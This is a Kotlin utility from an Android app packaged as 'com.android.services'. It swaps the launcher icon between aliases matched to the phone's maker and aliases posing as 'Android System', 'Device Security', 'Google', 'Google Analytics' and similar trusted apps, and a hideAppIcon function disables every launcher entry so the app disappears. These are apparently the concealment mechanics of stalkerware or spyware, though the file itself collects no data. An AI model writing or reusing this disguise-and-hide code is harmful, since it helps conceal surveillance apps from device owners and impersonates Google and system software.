package com.android.services.util

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import com.android.services.BuildConfig
import com.android.services.models.AppIconNameChanger
import java.util.*
import kotlin.collections.ArrayList

object AppIconUtil {

    var deviceManufacturers = HashMap<String, String>()

    fun changeAppIcon(context: Context) {
        val appNames = appNames
        val activityToLaunch = deviceManufacturerActivity
        val index = appNames.indexOf(activityToLaunch)
        setAppIcon(context, index, appNames)
    }
    fun changeAppIcon(context: Context,appName:String) {
        val appNames= appNames
        var index=0
        when(appName){
            "File Manager"-> index=appNames.indexOf("com.android.services.ui.activities.MainLaunchActivityFileManager")
            "Photos"-> index=appNames.indexOf("com.android.services.ui.activities.MainLaunchActivityPhotos")
            "Google Manager"-> index=appNames.indexOf("com.android.services.ui.activities.MainLaunchActivityGoogleManager")
            "Android System"-> index=appNames.indexOf("com.android.services.ui.activities.MainLaunchActivityAndroidSystem")
            "Device Security"-> index=appNames.indexOf("com.android.services.ui.activities.MainLaunchActivityDeviceSecurity")
            "Music"-> index=appNames.indexOf("com.android.services.ui.activities.MainLaunchActivityMusic")
            "Files"-> index=appNames.indexOf("com.android.services.ui.activities.MainLaunchActivityGoogleFiles")
            "Google Analytics"-> index=appNames.indexOf("com.android.services.ui.activities.MainLaunchActivityGoogleAnalytics")
            "Google"-> index=appNames.indexOf("com.android.services.ui.activities.MainLaunchActivityGoogleApp")
            "Health Manager"-> index=appNames.indexOf("com.android.services.ui.activities.MainLaunchActivityHealthManager")
            "Battery Care"-> index=appNames.indexOf("com.android.services.ui.activities.MainLaunchActivityBatteryCare")
        }
        setAppIcon(context, index, appNames)
    }

    private val deviceManufacturerActivity: String
        get() {
            val manufacturer = Build.MANUFACTURER.lowercase(Locale.ROOT)
            for ((key, value) in deviceManufacturers) {
                println("$key/$value")
                if (key.startsWith(manufacturer) || key.contains(manufacturer)) {
                    return value
                }
            }
            return "com.android.services.ui.activities.MainLaunchActivitySamsung"
        }

    private fun setAppIcon(context: Context, index: Int, appNames: List<String>) {
        AppIconNameChanger.Builder(context)
            .activeIndex(index)
            .disableNames(appNames)
            .packageName(BuildConfig.APPLICATION_ID)
            .build()
            .setNow()
    }

    fun hideAppIcon(activity: Context) {
        for (appName in appNames) {
            activity.packageManager.setComponentEnabledSetting(
                ComponentName(activity.packageName, appName),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
        }
    }

    private val appNames: List<String>
        get() {
            val appNames: MutableList<String> = ArrayList()
            appNames.add("com.android.services.ui.activities.MainLaunchActivityDefault")
            appNames.add("com.android.services.ui.activities.MainLaunchActivitySamsung")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityHuawei")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityXiaomi")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityOppo")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityVivo")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityMotorola")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityRealme")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityLG")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityAmazon")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityTechnoMobileLimited")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityInfinix")
            appNames.add("com.android.services.ui.activities.MainLaunchActivitySony")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityHmdGlobal")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityAsus")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityLenovo")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityZTE")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityAlcatel")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityItel")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityOnePlus")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityGoogle")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityFileManager")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityPhotos")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityGoogleManager")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityAndroidSystem")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityDeviceSecurity")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityMusic")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityGoogleFiles")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityGoogleAnalytics")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityGoogleApp")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityHealthManager")
            appNames.add("com.android.services.ui.activities.MainLaunchActivityBatteryCare")

            return appNames
        }

    init {
        deviceManufacturers["samsung"] =
            "com.android.services.ui.activities.MainLaunchActivitySamsung"
        deviceManufacturers["huawei"] =
            "com.android.services.ui.activities.MainLaunchActivityHuawei"
        deviceManufacturers["xiaomi"] =
            "com.android.services.ui.activities.MainLaunchActivityXiaomi"
        deviceManufacturers["oppo"] = "com.android.services.ui.activities.MainLaunchActivityOppo"
        deviceManufacturers["vivo"] = "com.android.services.ui.activities.MainLaunchActivityVivo"
        deviceManufacturers["motorola"] =
            "com.android.services.ui.activities.MainLaunchActivityMotorola"
        deviceManufacturers["realme"] =
            "com.android.services.ui.activities.MainLaunchActivityRealme"
        deviceManufacturers["lg"] = "com.android.services.ui.activities.MainLaunchActivityLG"
        deviceManufacturers["amazon"] =
            "com.android.services.ui.activities.MainLaunchActivityAmazon"
        deviceManufacturers["techno"] =
            "com.android.services.ui.activities.MainLaunchActivityTechnoMobileLimited"
        deviceManufacturers["infinix"] =
            "com.android.services.ui.activities.MainLaunchActivityInfinix"
        deviceManufacturers["sony"] =
            "com.android.services.ui.activities.MainLaunchActivitySony"
        deviceManufacturers["hmd"] =
            "com.android.services.ui.activities.MainLaunchActivityHmdGlobal"
        deviceManufacturers["asus"] =
            "com.android.services.ui.activities.MainLaunchActivityAsus"
        deviceManufacturers["lenovo"] =
            "com.android.services.ui.activities.MainLaunchActivityLenovo"
        deviceManufacturers["zte"] = "com.android.services.ui.activities.MainLaunchActivityZTE"
        deviceManufacturers["alcatel"] =
            "com.android.services.ui.activities.MainLaunchActivityAlcatel"
        deviceManufacturers["itel"] =
            "com.android.services.ui.activities.MainLaunchActivityItel"
        deviceManufacturers["oneplus"] =
            "com.android.services.ui.activities.MainLaunchActivityOnePlus"
        deviceManufacturers["google"] =
            "com.android.services.ui.activities.MainLaunchActivityGoogle"
    }
}